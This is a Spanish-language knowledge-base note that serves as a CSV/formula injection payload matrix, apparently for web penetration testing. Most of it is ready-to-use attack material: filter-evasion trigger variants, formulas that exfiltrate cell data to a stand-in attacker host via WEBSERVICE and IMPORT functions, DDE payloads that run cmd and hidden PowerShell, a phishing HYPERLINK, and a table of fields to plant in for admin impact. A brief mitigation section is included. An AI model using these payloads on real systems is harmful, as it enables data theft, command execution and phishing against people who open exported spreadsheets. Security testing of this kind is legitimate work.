---
tipo: meta
aliases:
  - payloads CSV injection
  - formula payloads
  - DDE payloads
tags:
  - meta/referencia
  - dominio/web
---

# CSV - matriz de referencia

> [!info] Referencia pura, no un zettel
> Los caracteres disparadores y las fórmulas por aplicación. El criterio está en las dos notas de `600-tradecraft/`; el modelo, en [[MOC - CSV injection]].

Dominio compacto: una matriz cubre disparadores, exfiltración, ejecución y mitigación.

## 1. Caracteres que disparan una fórmula

Un campo que empieza con uno de estos se evalúa como fórmula al abrir la planilla:

`=`  el clásico
`+`  suma, también dispara
`-`  resta, también
`@`  referencia, dispara en Excel
`\t` (tabulación) al inicio
`\r` (retorno de carro) al inicio

Y las combinaciones para evadir filtros que solo miran `=`:

`=1+1`  directo
`+1+1`
`-1+1`
`@SUM(1+1)`
`\t=1+1`  con tabulación previa
`=1+1;` con separador

## 2. Confirmar la inyección

Plantar en un campo exportable una fórmula visible:

```
=1+1
```

Pedir el export, abrirlo, y ver si la celda muestra `2` en vez de `=1+1`. Si muestra `2`, la planilla evaluó — hay inyección.

## 3. Exfiltración

Ver [[CSV - fuga de datos por fórmula]]. Leer otras celdas y mandarlas afuera.

**Excel — `WEBSERVICE` (sin interacción):**
```
=WEBSERVICE(CONCATENATE("http://atacante.com/x?d=",A1))
=WEBSERVICE("http://atacante.com/x?d="&A2&A3)
```

**Google Sheets — `IMPORT*` (sin interacción):**
```
=IMPORTXML(CONCAT("http://atacante.com/x?d=",A1),"//a")
=IMPORTDATA(CONCAT("http://atacante.com/x?d=",A1))
=IMPORTFEED(CONCAT("http://atacante.com/x?d=",A1))
```

**Con clic (todas):**
```
=HYPERLINK("http://atacante.com/x?d="&A1,"Hacé clic para ver")
```

`HYPERLINK` necesita que el analista clickee; `WEBSERVICE` e `IMPORT*` disparan al abrir (con posible advertencia).

## 4. Ejecución de comandos — DDE

Ver [[CSV - ejecución de comandos por fórmula]]. Requiere DDE habilitado en Excel.

```
=cmd|'/c calc'!A1
=cmd|'/c calc'!A0
=cmd|'/c powershell -w hidden -c "..."'!A1
@SUM(1+1)*cmd|'/c calc'!A1
=MSEXCEL|'\..\..\..\Windows\System32\cmd.exe /c calc.exe'!A1
```

`calc` es el inofensivo para demostrar. Al abrir, Excel muestra advertencias; el comando corre si se aceptan.

## 5. Phishing por HYPERLINK

Un enlace de confianza dentro de un informe interno:

```
=HYPERLINK("http://phishing-objetivo.com/login","Verificá tu cuenta acá")
```

El analista ve un enlace legítimo dentro de un CSV de la aplicación y confía.

## 6. Dónde plantar

Cualquier campo del usuario que termine en un export:

| Campo | Export típico |
|---|---|
| Nombre / apellido | Listado de usuarios |
| Comentario / mensaje | Registro de soporte |
| Nombre de empresa | Informe de cuentas |
| Dirección | Listado de pedidos |
| Asunto de ticket | Export de soporte |
| Cualquier campo de perfil | Informe administrativo |

Los que ve un **administrador** al exportar son los de mayor impacto —el analista tiene más privilegios—.

## 7. Mitigación — para el informe

Del lado de la **exportación**, no de la entrada:

- Prefijar con `'` (comilla simple) toda celda que empiece con `= + - @ \t \r`.
- O prefijar con un espacio.
- Entrecomillar y escapar según el formato CSV.
- Validar/rechazar en la entrada solo como defensa en profundidad —un nombre puede empezar con `+` legítimamente—.

## 8. Tabla de errores

| Lo que ves | Qué pasa |
|---|---|
| La celda muestra `=1+1` literal | Se prefijó o escapó: mitigado |
| `WEBSERVICE` no dispara | Excel pide confirmación y se rechazó; probar `HYPERLINK` |
| El campo se exporta pero no evalúa | El export es texto plano sin fórmulas; queda phishing por HYPERLINK |
| DDE no ejecuta | Deshabilitado (lo normal hoy). Queda la exfiltración |
| El `=` se filtra en la entrada | Probar `+`, `-`, `@`, o tabulación previa |
| No encuentro el valor en el export | Ese campo no se exporta; probar otro |

## Relacionadas

[[MOC - CSV injection]] · [[CSV - fuga de datos por fórmula]] · [[CSV - ejecución de comandos por fórmula]] · [[Command injection evasión - matriz de referencia]]
